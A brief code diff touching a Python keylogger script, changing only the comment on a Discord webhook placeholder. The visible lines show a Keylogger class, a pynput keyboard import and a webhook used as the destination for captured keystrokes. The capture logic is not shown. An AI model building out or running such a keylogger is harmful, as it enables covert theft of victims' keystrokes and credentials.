@@ -9,7 +9,7 @@ import ctypes
 from datetime import datetime
 from pynput import keyboard
 
-WEBHOOK_URL = "YOUR_WEBHOOK_HERE"  # Replace with your Discord webhook
+WEBHOOK_URL = "YOUR_WEBHOOK_HERE" # Your webhook here
 
 class Keylogger:
     def __init__(self, webhook_url: str, log_interval: int = 60):
